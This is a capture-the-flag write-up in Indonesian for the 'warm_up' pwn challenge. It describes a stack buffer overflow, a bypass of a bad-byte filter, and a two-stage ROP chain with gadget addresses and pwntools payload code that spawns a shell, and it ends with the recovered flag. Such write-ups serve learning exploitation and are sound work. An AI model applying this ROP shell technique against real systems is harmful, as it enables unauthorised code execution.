# warm-up Writeup

## Ringkasan

Challenge ini adalah binary pwn 64-bit statically linked bernama `warm_up`.
Bug utamanya adalah stack buffer overflow di fungsi `vuln()`. Proteksi NX aktif,
binary tidak PIE, dan fungsi `vuln()` tidak melakukan validasi stack canary saat
return.

Flag:

```text
THEM?!CTF{gReaT!_N0w_7h4T_y0u_4R3_f1rED_Up,_it_Is_7IME_70_s0Lv3_moRe_CHaLL3N9E5!}
```

## Recon

Hasil `file`:

```text
warm_up: ELF 64-bit LSB executable, x86-64, statically linked, not stripped
```

Hasil `checksec`:

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
```

Karena binary tidak PIE, alamat gadget ROP stabil. Binary juga tidak stripped,
jadi fungsi `main` dan `vuln` bisa langsung dianalisis.

Saat dijalankan, program mencetak:

```text
welcome players! enjoy your warmup game.
aight ! now show me what u got.
```

## Analisis Vulnerability

Bagian penting di `vuln()`:

```asm
lea    rax,[rbp-0x80]
mov    edx,0x64
mov    esi,0x0
mov    rdi,rax
call   memset

lea    rax,[rbp-0x80]
mov    edx,0x120
mov    rsi,rax
mov    edi,0x0
call   read
```

Buffer lokal ukurannya `0x80`, tetapi program membaca `0x120` byte dari stdin.
Ini memberi kontrol sampai saved RIP.

Offset ke RIP:

```text
0x80 buffer + 0x8 saved rbp = 0x88
```

Setelah input dibaca, program melakukan filter terhadap seluruh byte input.
Byte yang dilarang:

```text
/ s a t
```

Jika salah satu byte itu muncul, program langsung `exit(1)`.

Ini berarti payload ROP tahap pertama harus bebas dari byte:

```python
b"/sat"
```

## Strategi Exploit

Karena NX aktif, exploit memakai ROP. Karena binary static dan tidak PIE, gadget
dan fungsi libc static punya alamat tetap.

Gadget yang dipakai:

```text
pop rdi ; ret              0x401f9f
pop rsi ; ret              0x40a00e
pop rdx ; pop rbx ; ret    0x485d2b
pop rax ; ret              0x44ffc7
syscall                    0x401d54
read                       0x44f560
```

Alamat `.bss` yang dipakai:

```text
0x4c72a0
```

Masalahnya, string `/bin/sh` mengandung `/` dan `s`, sehingga tidak bisa
dimasukkan di payload pertama. Solusinya adalah membuat payload pertama hanya
berisi ROP chain bebas badchar:

1. Panggil `read(0, .bss, 8)`.
2. Setelah filter selesai dan ROP berjalan, kirim `/bin/sh\x00` sebagai input
   kedua.
3. Jalankan syscall `execve(.bss, 0, 0)`.

Dengan begitu, filter hanya memeriksa payload tahap pertama. String `/bin/sh`
baru dikirim setelah program masuk ke ROP chain.

## Exploit

Exploit final ada di `exploit.py`.

Payload intinya:

```python
payload = b"A" * 0x88
payload += flat(
    POP_RDI, 0,
    POP_RSI, BSS,
    POP_RDX_RBX, 8, 0,
    READ,
    POP_RAX, 59,
    POP_RDI, BSS,
    POP_RSI, 0,
    POP_RDX_RBX, 0, 0,
    SYSCALL,
)
```

Validasi badchar:

```text
len 280
badchars []
```

Test lokal berhasil mendapatkan shell:

```text
PWNED
uid=1000(nata) gid=1000(nata) groups=...
```

Eksekusi remote:

```bash
./exploit.py REMOTE
```

Output remote:

```text
THEM?!CTF{gReaT!_N0w_7h4T_y0u_4R3_f1rED_Up,_it_Is_7IME_70_s0Lv3_moRe_CHaLL3N9E5!}
```
